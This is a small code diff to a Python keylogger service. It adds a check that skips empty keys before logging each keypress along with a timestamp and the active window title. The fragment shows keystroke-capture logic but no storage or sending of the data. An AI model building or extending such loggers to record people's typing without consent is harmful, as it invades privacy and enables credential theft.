@@ -9,6 +9,8 @@ class KeyLoggerService(IKeyLogger):
 
     def on_press(self, key) -> None:
         key = ToolBox.format_key(key)
+        if key == "":
+            return
         current_time = time.time()
         current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
         active_window = pygetwindow.getActiveWindowTitle()
